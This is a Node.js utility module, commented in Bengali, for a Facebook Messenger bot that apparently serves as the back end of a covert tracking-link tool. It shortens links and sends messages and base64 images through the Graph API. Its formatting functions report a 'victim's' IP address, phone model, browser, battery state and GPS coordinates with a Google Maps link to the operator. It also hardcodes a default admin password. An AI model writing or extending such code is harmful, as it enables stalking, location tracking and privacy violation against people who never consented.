const axios = require('axios');
const Config = require('../models/Config');
const fs = require('fs-extra');
const path = require('path');
const { nanoid } = require('nanoid');

function getLocalConfig() {
  const file = path.join(__dirname, '../data/config.json');
  if (fs.existsSync(file)) {
    try {
      return fs.readJsonSync(file);
    } catch (e) {
      return { mongoUri: '', adminPassword: 'Sakib@7890' };
    }
  }
  return { mongoUri: '', adminPassword: 'Sakib@7890' };
}

async function getConfig() {
  try {
    let config = await Config.findOne({ key: 'bot_config' });
    if (!config) {
      config = new Config({
        key: 'bot_config',
        pageAccessToken: '',
        verifyToken: 'Sakib_Verify',
        baseUrl: ''
      });
      await config.save();
    }
    return config;
  } catch (err) {
    console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ:', err.message);
    return { pageAccessToken: '', verifyToken: 'Sakib_Verify', baseUrl: 'http://localhost:3000' };
  }
}

// ================================================================
// টেক্সট মেসেজ
// ================================================================
async function sendMessage(recipientId, text) {
  try {
    const config = await getConfig();
    const token = config.pageAccessToken;
    if (!token || token === '') {
      console.error('❌ টোকেন সেট নেই!');
      return { success: false, error: 'TOKEN_MISSING' };
    }
    if (token.length < 50) {
      console.error('❌ টোকেন খুব ছোট!');
      return { success: false, error: 'INVALID_TOKEN' };
    }
    const response = await axios.post(
      `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
      {
        recipient: { id: recipientId },
        message: { text: text }
      },
      { timeout: 10000 }
    );
    console.log(`✅ টেক্সট মেসেজ পাঠানো হয়েছে: ${recipientId}`);
    return { success: true, data: response.data };
  } catch (err) {
    if (err.response) {
      console.error('❌ ফেসবুক এরর:', err.response.data);
    } else {
      console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.message);
    }
    return { success: false, error: err.message };
  }
}

// ================================================================
// ইমেজ ফাইল সেভ করা (Base64 থেকে)
// ================================================================
async function saveImageFile(base64Image) {
  try {
    const imagesDir = path.join(__dirname, '../public/images');
    await fs.ensureDir(imagesDir);

    // Base64 ডাটা থেকে এক্সট্র্যাক্ট
    let base64Data = base64Image;
    let ext = 'jpg';

    // যদি data:image/jpeg;base64, ফরম্যাটে আসে
    const matches = base64Image.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
    if (matches && matches.length === 3) {
      ext = matches[1] === 'jpeg' ? 'jpg' : matches[1];
      base64Data = matches[2];
    }

    const filename = `${nanoid(10)}.${ext}`;
    const filepath = path.join(imagesDir, filename);
    const buffer = Buffer.from(base64Data, 'base64');
    await fs.writeFile(filepath, buffer);

    console.log(`📸 ইমেজ সেভ করা হয়েছে: ${filename}`);
    return filename;
  } catch (err) {
    console.error('❌ ইমেজ সেভ করতে ব্যর্থ:', err);
    return null;
  }
}

// ================================================================
// ইমেজ মেসেজ পাঠানো (URL দিয়ে)
// ================================================================
async function sendImageMessage(recipientId, imageUrl) {
  try {
    const config = await getConfig();
    const token = config.pageAccessToken;
    if (!token || token === '') {
      console.error('❌ টোকেন সেট নেই!');
      return { success: false, error: 'TOKEN_MISSING' };
    }
    const response = await axios.post(
      `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
      {
        recipient: { id: recipientId },
        message: {
          attachment: {
            type: 'image',
            payload: {
              is_reusable: false,
              url: imageUrl
            }
          }
        }
      },
      { timeout: 30000 }
    );
    console.log(`✅ ইমেজ মেসেজ পাঠানো হয়েছে: ${recipientId}`);
    return { success: true, data: response.data };
  } catch (err) {
    if (err.response) {
      console.error('❌ ইমেজ পাঠাতে ফেসবুক এরর:', err.response.data);
    } else {
      console.error('❌ ইমেজ পাঠাতে ব্যর্থ:', err.message);
    }
    return { success: false, error: err.message };
  }
}

// ================================================================
// Base64 ইমেজ সেভ করে URL দিয়ে পাঠানো (আপডেটেড)
// ================================================================
async function sendImageMessageBase64(recipientId, base64Image) {
  try {
    // ১. ইমেজ ফাইল সেভ করি
    const filename = await saveImageFile(base64Image);
    if (!filename) {
      console.error('❌ ইমেজ সেভ করতে ব্যর্থ');
      return { success: false, error: 'IMAGE_SAVE_FAILED' };
    }

    // ২. কনফিগ থেকে বেস URL নিই
    const config = await getConfig();
    const baseUrl = config.baseUrl || 'http://localhost:3000';

    // ৩. পাবলিক URL তৈরি করি
    const imageUrl = `${baseUrl}/images/${filename}`;

    // ৪. sendImageMessage দিয়ে Facebook-এ পাঠাই
    return await sendImageMessage(recipientId, imageUrl);
  } catch (err) {
    console.error('❌ sendImageMessageBase64 error:', err.message);
    return { success: false, error: err.message };
  }
}

// ================================================================
// ইউজার প্রোফাইল
// ================================================================
async function getUserProfile(senderId) {
  try {
    const config = await getConfig();
    const token = config.pageAccessToken;
    if (!token) return null;
    const res = await axios.get(`https://graph.facebook.com/${senderId}?access_token=${token}`);
    return res.data;
  } catch (err) {
    console.error('Profile fetch error:', err.message);
    return null;
  }
}

// ================================================================
// লিংক শর্ট করা
// ================================================================
async function shortenUrl(longUrl) {
  try {
    const response = await axios.get(
      `https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`,
      { timeout: 5000 }
    );
    const shortUrl = response.data.trim();
    if (shortUrl.startsWith('Error')) {
      console.warn('⚠️ is.gd শর্ট করতে ব্যর্থ:', shortUrl);
      return longUrl;
    }
    return shortUrl;
  } catch (err) {
    console.warn('⚠️ is.gd API ডাউন বা টাইমআউট:', err.message);
    return longUrl;
  }
}

// ================================================================
// ফোনের মডেল বের করা
// ================================================================
function getDeviceModel(device) {
  const ua = device.userAgent || '';
  let match = ua.match(/\([^;]+;\s*[^;]+;\s*([^;\)]+)/);
  if (match) {
    let model = match[1].trim();
    if (model.includes(' Build/')) {
      model = model.split(' Build/')[0];
    }
    return model;
  }
  match = ua.match(/\(([^;\)]+); CPU iPhone OS/);
  if (match) return match[1].trim();
  match = ua.match(/\(Windows NT [^;]+;\s*([^;\)]+)/);
  if (match) return match[1].trim();
  return device.platform || 'N/A';
}

// ================================================================
// বাংলাদেশ সময় তৈরির ফাংশন
// ================================================================
function getBangladeshTime() {
  const now = new Date();
  const bdTime = new Date(now.getTime() + (6 * 60 * 60 * 1000));
  const day = String(bdTime.getUTCDate()).padStart(2, '0');
  const month = String(bdTime.getUTCMonth() + 1).padStart(2, '0');
  const year = bdTime.getUTCFullYear();
  let hours = bdTime.getUTCHours();
  const minutes = String(bdTime.getUTCMinutes()).padStart(2, '0');
  const seconds = String(bdTime.getUTCSeconds()).padStart(2, '0');
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12 || 12;
  return `${day}/${month}/${year}, ${hours}:${minutes}:${seconds} ${ampm}`;
}

// ================================================================
// ভিক্টিম ডেটা ফরম্যাট (IP ও লোকেশন N/A থাকলে লাইন বাদ)
// ================================================================
function formatVictimData(victim) {
  const d = victim.device || {};
  const deviceTime = getBangladeshTime();
  let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
  
  // IP শুধু থাকলেই দেখান
  if (victim.ip && victim.ip !== '0.0.0.0' && victim.ip !== 'N/A') {
    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip}\n`;
  }
  msg += `🕐 *সময়:* ${deviceTime}\n\n`;

  const model = getDeviceModel(d);
  msg += `📱 *ফোনের মডেল:* ${model}\n`;
  
  const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
  msg += `🌐 *ব্রাউজার:* ${browser}\n`;
  msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
  msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;

  const b = victim.battery || {};
  msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
  msg += `⚡ *চার্জিং:* ${b.charging ? 'হ্যাঁ ✅' : 'না ❌'}\n`;

  return msg;
}

// ================================================================
// লোকেশন মেসেজ ফরম্যাট করা (GPS লোকেশন)
// ================================================================
function formatLocationMessage(gpsLocation) {
  if (!gpsLocation || !gpsLocation.latitude) {
    return null;
  }
  return `📍 লোকেশন: ${gpsLocation.latitude}, ${gpsLocation.longitude}\n🌍 Google Maps: https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
}

// ================================================================
// সব এক্সপোর্ট
// ================================================================
module.exports = {
  getLocalConfig,
  getConfig,
  sendMessage,
  saveImageFile,
  sendImageMessage,
  sendImageMessageBase64,
  getUserProfile,
  shortenUrl,
  getDeviceModel,
  formatVictimData,
  formatLocationMessage
};